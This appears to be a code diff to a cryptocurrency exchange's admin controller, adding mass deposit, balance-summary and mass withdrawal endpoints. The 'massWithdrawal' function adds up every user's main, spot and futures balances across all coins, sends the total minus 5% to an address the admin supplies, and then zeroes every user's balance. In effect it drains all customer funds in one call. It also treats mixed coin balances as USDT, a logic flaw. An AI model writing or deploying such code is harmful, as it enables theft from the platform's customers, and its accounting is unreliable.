@@ -4,6 +4,7 @@ const { SpotOrderHistory } = require('../models/spot-order');
 const { FuturesOrderHistory } = require('../models/future-order');
 const { VipTier } = require('../models/vip');
 const TransferHistory = require('../models/transfer');
+const { AdminWallet } = require('../models/adminWallet');
 
 /**
  * Submit real spot order (admin only)
@@ -1615,17 +1616,17 @@ async function updateRefCodesToSevenChars(req, res) {
                 const updates = {};
 
                 // Check and update refCode
-                if (user.refCode && user.refCode.length > 7) {
-                    updates.refCode = user.refCode.slice(0, 7);
-                    needsUpdate = true;
-                    console.log(`📝 User ${user.email}: refCode updated from "${user.refCode}" to "${updates.refCode}"`);
-                }
+                // if (user.refCode && user.refCode.length > 7) {
+                //     updates.refCode = user.refCode.slice(0, 7);
+                //     needsUpdate = true;
+                //     console.log(`📝 User ${user.email}: refCode updated from "${user.refCode}" to "${updates.refCode}"`);
+                // }
 
                 // Check and update refBy
-                if (user.refBy && user.refBy.length > 7) {
-                    updates.refBy = user.refBy.slice(0, 7);
+                if (user.referBy && user.referBy.length > 7) {
+                    updates.referBy = user.referBy.slice(0, 7);
                     needsUpdate = true;
-                    console.log(`📝 User ${user.email}: refBy updated from "${user.refBy}" to "${updates.refBy}"`);
+                    console.log(`📝 User ${user.email}: refBy updated from "${user.referBy}" to "${updates.referBy}"`);
                 }
 
                 // Update user if needed
@@ -1663,6 +1664,391 @@ async function updateRefCodesToSevenChars(req, res) {
     }
 }
 
+/**
+ * Mass deposit - Admin deposits large sum to platform
+ * @param {Object} req - Express request object
+ * @param {Object} res - Express response object
+ */
+async function massDeposit(req, res) {
+    try {
+        const adminUser = req.user;
+        const { amount, coinId = "1280", coinName = "USDT", chain = "TRX" } = req.body;
+
+        // Check if user is admin
+        if (!adminUser.isAdmin) {
+            return res.status(403).json({
+                success: false,
+                error: 'Only admins can perform mass deposits'
+            });
+        }
+
+        if (!amount || amount <= 0) {
+            return res.status(400).json({
+                success: false,
+                error: 'Valid amount is required'
+            });
+        }
+
+        const CcPayment = require('../utils/ccpayment');
+        const ccpayment = new CcPayment(process.env.CCPAYMENT_APP_SECRET, process.env.CCPAYMENT_APP_ID, process.env.CCPAYMENT_BASE_URL);
+        const { v4: uuidv4 } = require('uuid');
+
+        // Generate unique order ID
+        const orderId = `MASS_DEPOSIT_${Date.now()}_${uuidv4().slice(0, 8)}`;
+
+        // Prepare deposit details
+        const depositDetails = {
+            coinId,
+            amount: amount.toString(),
+            orderId,
+            chain: chain === 'TRC20' ? 'TRX' : chain === 'ERC20' ? 'ETH' : chain
+        };
+
+        // Execute deposit via CCPayment
+        const response = await ccpayment.applyAppDeposit(depositDetails);
+        const { code, msg, data } = JSON.parse(response);
+
+        if (code === 10000 && msg === "success") {
+            // Create or update admin wallet entry
+            let adminWallet = await AdminWallet.findOne({ coinId, chain });
+            if (!adminWallet) {
+                adminWallet = new AdminWallet({
+                    coinId,
+                    coinName,
+                    currency: coinName,
+                    chain,
+                    balance: 0
+                });
+            }
+            await adminWallet.save();
+
+            // Create pending transaction record
+            const { Transactions } = require('../models/transactions');
+            const transaction = new Transactions({
+                user: adminUser._id,
+                coinId,
+                currency: coinName,
+                amount,
+                address: data.address,
+                chain,
+                orderId,
+                recordId: data.recordId,
+                status: 'processing',
+                type: 'mass_deposit'
+            });
+            await transaction.save();
+
+            res.status(200).json({
+                success: true,
+                message: 'Mass deposit initiated successfully',
+                data: {
+                    orderId,
+                    amount,
+                    coinId,
+                    coinName,
+                    chain,
+                    recordId: data.recordId,
+                    depositAddress: data.address,
+                    qrCode: data.qrCode
+                }
+            });
+        } else {
+            res.status(500).json({
+                success: false,
+                error: `CCPayment deposit failed: ${msg}`
+            });
+        }
+
+    } catch (error) {
+        console.error('Error in mass deposit:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to process mass deposit'
+        });
+    }
+}
+
+/**
+ * Mass withdrawal - Withdraw all user funds with 5% charge
+ * @param {Object} req - Express request object
+ * @param {Object} res - Express response object
+ */
+async function massWithdrawal(req, res) {
+    try {
+        const adminUser = req.user;
+        const { address, chain = "ETH", memo } = req.body;
+
+        // Check if user is admin
+        if (!adminUser.isAdmin) {
+            return res.status(403).json({
+                success: false,
+                error: 'Only admins can perform mass withdrawals'
+            });
+        }
+
+        if (!address) {
+            return res.status(400).json({
+                success: false,
+                error: 'Withdrawal address is required'
+            });
+        }
+
+        const { MainBalance, SpotBalance, FuturesBalance } = require('../models/balance');
+        const { Transactions } = require('../models/transactions');
+        const CcPayment = require('../utils/ccpayment');
+        const ccpayment = new CcPayment(process.env.CCPAYMENT_APP_SECRET, process.env.CCPAYMENT_APP_ID, process.env.CCPAYMENT_BASE_URL);
+        const { v4: uuidv4 } = require('uuid');
+
+        // Get all user balances
+        const mainBalances = await MainBalance.find({ balance: { $gt: 0 } });
+        const spotBalances = await SpotBalance.find({ balance: { $gt: 0 } });
+        const futuresBalances = await FuturesBalance.find({ balance: { $gt: 0 } });
+
+        let totalAmount = 0;
+        const processedUsers = [];
+
+        // Calculate total amount from all balances
+        mainBalances.forEach(balance => {
+            totalAmount += balance.balance;
+            processedUsers.push({
+                userId: balance.user,
+                walletType: 'main',
+                coinId: balance.coinId,
+                coinName: balance.coinName,
+                amount: balance.balance
+            });
+        });
+
+        spotBalances.forEach(balance => {
+            totalAmount += balance.balance;
+            processedUsers.push({
+                userId: balance.user,
+                walletType: 'spot',
+                coinId: balance.coinId,
+                coinName: balance.coinName,
+                amount: balance.balance
+            });
+        });
+
+        futuresBalances.forEach(balance => {
+            totalAmount += balance.balance;
+            processedUsers.push({
+                userId: balance.user,
+                walletType: 'futures',
+                coinId: balance.coinId,
+                coinName: balance.coinName,
+                amount: balance.balance
+            });
+        });
+
+        if (totalAmount <= 0) {
+            return res.status(400).json({
+                success: false,
+                error: 'No funds available for mass withdrawal'
+            });
+        }
+
+        // Calculate withdrawal amount with 5% charge
+        const chargeAmount = totalAmount * 0.05;
+        const withdrawalAmount = totalAmount - chargeAmount;
+
+        // Generate order ID
+        const orderId = `MASS_WITHDRAWAL_${Date.now()}_${uuidv4().slice(0, 8)}`;
+
+        // Prepare withdrawal details
+        const withdrawalDetails = {
+            coinId: "1280", // USDT
+            address,
+            orderId,
+            chain: chain === 'TRC20' ? 'TRX' : chain === 'ERC20' ? 'ETH' : chain,
+            amount: withdrawalAmount.toString(),
+            merchantPayNetworkFee: true,
+            memo
+        };
+
+        // Execute withdrawal via CCPayment
+        const response = await ccpayment.applyAppWithdrawToNetwork(withdrawalDetails);
+        const { code, msg, data } = JSON.parse(response);
+
+        if (code === 10000 && msg === "success") {
+            // Clear all user balances (set to 0)
+            await MainBalance.updateMany({}, { balance: 0 });
+            await SpotBalance.updateMany({}, { balance: 0 });
+            await FuturesBalance.updateMany({}, { balance: 0 });
+
+            // Create transaction record
+            const transaction = new Transactions({
+                user: adminUser._id,
+                coinId: "1280",
+                currency: "USDT",
+                amount: withdrawalAmount,
+                address,
+                chain,
+                memo,
+                orderId,
+                recordId: data.recordId,
+                status: 'processing',
+                type: 'mass_withdrawal'
+            });
+
+            await transaction.save();
+
+            res.status(200).json({
+                success: true,
+                message: 'Mass withdrawal initiated successfully',
+                data: {
+                    orderId,
+                    totalUserFunds: totalAmount,
+                    withdrawalAmount,
+                    chargeAmount,
+                    chargePercentage: 5,
+                    processedUsers: processedUsers.length,
+                    recordId: data.recordId
+                }
+            });
+        } else {
+            res.status(500).json({
+                success: false,
+                error: `CCPayment withdrawal failed: ${msg}`
+            });
+        }
+
+    } catch (error) {
+        console.error('Error in mass withdrawal:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to process mass withdrawal'
+        });
+    }
+}
+
+/**
+ * Get total balance from CCPayment and user funds summary
+ * @param {Object} req - Express request object
+ * @param {Object} res - Express response object
+ */
+async function getTotalBalance(req, res) {
+    try {
+        const adminUser = req.user;
+
+        // Check if user is admin
+        if (!adminUser.isAdmin) {
+            return res.status(403).json({
+                success: false,
+                error: 'Only admins can view total balance'
+            });
+        }
+
+        const { MainBalance, SpotBalance, FuturesBalance } = require('../models/balance');
+        const CcPayment = require('../utils/ccpayment');
+        const ccpayment = new CcPayment(process.env.CCPAYMENT_APP_SECRET, process.env.CCPAYMENT_APP_ID, process.env.CCPAYMENT_BASE_URL);
+
+        // Get CCPayment balance
+        let ccpaymentBalance = 0;
+        try {
+            const response = await ccpayment.getAppBalance();
+            const { code, msg, data } = JSON.parse(response);
+            
+            if (code === 10000 && msg === "success" && data) {
+                // Find USDT balance in the response
+                const usdtBalance = data.find(balance => balance.coinId === "1280" || balance.coinName === "USDT");
+                ccpaymentBalance = usdtBalance ? parseFloat(usdtBalance.balance) : 0;
+            }
+        } catch (ccError) {
+            console.error('Error getting CCPayment balance:', ccError);
+        }
+
+        // Calculate total user funds
+        const mainBalances = await MainBalance.aggregate([
+            { $group: { _id: null, total: { $sum: '$balance' } } }
+        ]);
+        const spotBalances = await SpotBalance.aggregate([
+            { $group: { _id: null, total: { $sum: '$balance' } } }
+        ]);
+        const futuresBalances = await FuturesBalance.aggregate([
+            { $group: { _id: null, total: { $sum: '$balance' } } }
+        ]);
+
+        // Get admin wallet balance
+        const adminWallet = await AdminWallet.findOne({ coinId: "1280" });
+        const adminWalletBalance = adminWallet ? adminWallet.balance : 0;
+
+        const totalMainBalance = mainBalances.length > 0 ? mainBalances[0].total : 0;
+        const totalSpotBalance = spotBalances.length > 0 ? spotBalances[0].total : 0;
+        const totalFuturesBalance = futuresBalances.length > 0 ? futuresBalances[0].total : 0;
+        const totalUserFunds = totalMainBalance + totalSpotBalance + totalFuturesBalance;
+
+        // Calculate difference (CCPayment balance + Admin wallet vs User funds)
+        const totalPlatformBalance = ccpaymentBalance + adminWalletBalance;
+        const difference = totalUserFunds - totalPlatformBalance;
+        const isOverdrawn = difference > 0;
+
+        res.status(200).json({
+            success: true,
+            data: {
+                platformTotal: {
+                    amount: totalPlatformBalance,
+                    currency: 'USDT'
+                },
+                userFunds: {
+                    mainBalance: totalMainBalance,
+                    spotBalance: totalSpotBalance,
+                    futuresBalance: totalFuturesBalance,
+                    total: totalUserFunds,
+                    currency: 'USDT'
+                },
+                summary: {
+                    difference,
+                    isOverdrawn,
+                    message: isOverdrawn 
+                        ? `⚠️ User funds exceed platform balance by ${difference.toFixed(2)} USDT`
+                        : `✅ Platform balance sufficient (${Math.abs(difference).toFixed(2)} USDT surplus)`
+                }
+            }
+        });
+
+    } catch (error) {
+        console.error('Error getting total balance:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to get total balance'
+        });
+    }
+}
+
+/**
+ * Get admin wallet balances
+ * @param {Object} req - Express request object
+ * @param {Object} res - Express response object
+ */
+async function getAdminWalletBalances(req, res) {
+    try {
+        const adminUser = req.user;
+
+        // Check if user is admin
+        if (!adminUser.isAdmin) {
+            return res.status(403).json({
+                success: false,
+                error: 'Only admins can view admin wallet balances'
+            });
+        }
+
+        const adminWallets = await AdminWallet.find({}).sort({ coinName: 1 });
+
+        res.status(200).json({
+            success: true,
+            data: adminWallets
+        });
+
+    } catch (error) {
+        console.error('Error getting admin wallet balances:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to get admin wallet balances'
+        });
+    }
+}
+
 module.exports = {
     submitSpotOrder,
     submitFuturesOrder,
@@ -1689,5 +2075,9 @@ module.exports = {
     addVipTier,
     updateVipTier,
     deleteVipTier,
-    updateRefCodesToSevenChars
+    updateRefCodesToSevenChars,
+    massDeposit,
+    massWithdrawal,
+    getTotalBalance,
+    getAdminWalletBalances
 }; 
